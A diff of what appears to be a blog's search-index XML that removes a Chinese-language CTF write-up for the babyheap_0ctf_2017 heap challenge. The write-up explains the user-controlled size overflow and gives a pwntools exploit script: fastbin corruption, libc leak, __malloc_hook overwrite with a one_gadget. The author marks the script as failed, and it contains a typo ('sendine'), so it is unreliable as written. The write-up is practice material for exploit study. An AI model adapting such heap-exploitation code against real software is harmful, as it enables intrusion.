@@ -4,33 +4,6 @@
   
     
     <entry>
-      <title>babyheap_0ctf_2017</title>
-      <link href="/2022/01/23/babyheap/"/>
-      <url>/2022/01/23/babyheap/</url>
-      
-        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/babyheap/checksec.png" alt="image-20220123155106885" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/23/babyheap/run.png" alt="image-20220123155242621" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/babyheap/main.png" alt="image-20220123155433486" style="zoom:80%;"><ol><li><p>allocate函数,根据用户输入size根据大小进行内存分配,本程序调用了calloc函数,与malloc不同的是分配内存后会把数据区域全部置0</p></li><li><p>fill,用户提供需要修改堆块的index和要修改的size,然后根据size读取用户输入,问题就出现在size可以由用户输入,我们可以任意构造size,实现伪造堆块的效果</p></li><li><img src="/2022/01/23/babyheap/fill.png" alt="image-20220123160726616" style="zoom: 50%;"></li><li><p>free 将堆块free</p></li><li><p>dump,根据堆块大小显示出堆块中的内容</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64', log_level = 'debug')elf = ELF("./babyheap")local = 0if local:    r = process("./babyheap") else:    r = remote("node4.buuoj.cn",26810)    def allocate(size):    r.recvuntil("Command: ")    r.sendline("1")    r.recvuntil("Size: ")    r.sendline(str(size))    def fill(index,content):    r.recvuntil("Command: ")    r.sendine("2")    r.recvuntil("Index: ")    r.sendline(str(index))    r.recvuntil("Size: ")    r.sendline(str(len(content)))    r.recvuntil("Content: ")    r.sendline(content)    def free(index):    r.recvuntil("Command: ")    r.sendline("3")    r.recvuntil("Index: ")    r.sendline(str(index))    def dump(index):    r.recvuntil("Command: ")    r.sendline("4")    r.recvuntil("Index: ")    r.sendline(str(index))    r.recvline()    return r.recvline()allocate(0x10) # 0allocate(0x10) # 1allocate(0x10) # 2allocate(0x10) # 3allocate(0x10) # 4free(1)free(2)payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p64(0x80)fill(0,payload)payload = p64(0)*3payload += p64(0x21)fill(3,payload) # 为了后面malloc做准备,绕过检查allocate(0x10)allocate(0x10)fill(1,'aaaabbbb')fill(2,'bbbbcccc')payload = p64(0)*3payload += p64(0x91)fill(3,payload)allocate(0x80)free(4)libc_base = u64(dump(2)[:8].strip().ljust(8,'\x00')) -0x3c4b78log.info("libc_base: "+ hex(libc_base))allocate(0x60)free(4)payload = p64(libc_base + 0x3c4aed)fill(2,payload)allocate(0x60)allocate(0x60)payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a)fill(6,payload)allocate(255)r.interactive()# this exp is failed,next one                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> pwn </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> heap </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>pwn2_sctf_2016</title>
       <link href="/2022/01/23/pwn2/"/>
       <url>/2022/01/23/pwn2/</url>
